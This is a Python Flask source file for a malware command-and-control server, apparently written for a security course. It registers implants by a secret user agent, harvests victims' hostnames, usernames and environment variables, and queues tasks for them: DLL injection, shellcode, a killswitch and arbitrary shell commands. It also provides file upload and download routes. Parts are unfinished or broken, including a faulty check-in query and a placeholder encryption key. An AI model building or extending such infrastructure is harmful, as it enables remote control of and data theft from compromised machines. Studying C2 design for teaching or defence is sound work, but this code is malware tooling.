##from lecture slides, refrenced 0xRick c2 code

import sqlite3
from flask import Flask, request, jsonify, send_from_directory
import threading
import os, sys, random, string
from app.models.agent import agents
import multiprocessing as mp
from multiprocessing import Process
import requests 
from app.app import createFlaskApp
import uuid
from werkzeug.utils import secure_filename
from app.models.base import db
from flask_sqlalchemy import SQLAlchemy as sql


"""控制端表"""

c2_server = "http://0.0.0.0:8080"
lock = mp.Lock()
implant_lock = mp.Lock()
TASKS = []
AGENTS = []
SHELL = []

createflask = createFlaskApp()
app = createflask.create_app()
encryptionkey = None


"""  
implant commands    
0 = sleep
1 = dllinjection
2 = shellcode
3 = killswitch
"""

path = "/Users/oliviazhou/Desktop/"
if os.path.exists(path) == False:
    os.mkdir(path)
app.config['UPLOAD_FOLDER'] = path


@app.route("/upload/<filename>", methods = ["GET", "POST"])
def upload_files(filename):
#from flask documentation
    if request.method == 'POST':
        print("make sure your file exists and is in the correct directory")
        if 'file' not in request.files:
            Flask.flash('No file part')
            return Flask.redirect(request.url)
        
        file = request.files['file']
        if file and file.filename != '':
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            print('successfully uploaded file')
            return ''
    return ''
        
@app.route('/downloads/<filename>', methods = ["GET"])
def download_file(filename):
    #update last_seen in database
    print(filename, " was downloaded")
    return send_from_directory('/Users/oliviazhou/Downloads', filename)


@app.route("/checkin", methods=["POST", "GET"])
def check_in():
    global TASKS, SHELL
    if request.method == "POST":
        whoami = request.get_json()
        if sql.session.query(db).filter(whoami).count() != 0:
            #update last_seen in database
            lock.acquire()
            try:
                task = "\n".join(TASKS[:1])
                TASKS = TASKS[1:]
                shell_command = ''
                if task == 2:
                    shell_command = shell_command.join(SHELL[:1])
                    SHELL = SHELL[1:]
            finally:
                lock.release()
            return task, shell_command
        else:
            return Flask.redirect(Flask.url_for('addAgent'))

@app.route("/response", methods=["POST"])
def print_response():
    print(request.data.decode())
    return ""

@app.route("/queue")
def print_queue():
    return jsonify(TASKS)

@app.route("/secret", methods=["POST"])
def add_request():
    r = request.json
    lock.acquire()
    try:
        for cmd in r:
            TASKS.append(cmd)
    finally:
        lock.release()
    print("Queued up ", r)
    return "True"

@app.route("/register", methods=['POST', 'GET'])
def addAgent():
    user_agent = str(request.user_agent).strip(" \r\n\t") # thank you windows
    if (user_agent == 'ny4n_ca1'):
        implant_id = str(uuid.uuid4())
        fromimplant = request.get_json()
        guid = fromimplant['guid']
        hostname = fromimplant['hostname']
        username = fromimplant['username']
        environment_variables = fromimplant["enviroment_variables"]
        implant_ip = request.environ['REMOTE_ADDR']
        #update last_seen in database
        print(fromimplant, implant_ip, implant_id)
        encryption_key = encryptionkey()
        #agent = agents(implant_id, guid, hostname, username, implant_ip, encryptionkey)
        #addtodatabase(agent)
        return jsonify(encryption_key)
    else:
        return jsonify("you're not authorized >:(")
    
@app.route("/shell", methods=["POST"])
def get_shell_commands():
    command = request.get_json()
    lock.acquire()
    try:
        shellcommand = command[0]
        SHELL.append(shellcommand)
    finally:
        lock.release()
    print("accepted shell_code")
    return "True"
    
def encryptionkey():
    #if encryptionkey == None:
    #    encryptionkey = getencryptionkey()
    encryptionkey = "blahblahblah"
    return encryptionkey

    
    
    
    
    
    
    
    
    
    
    
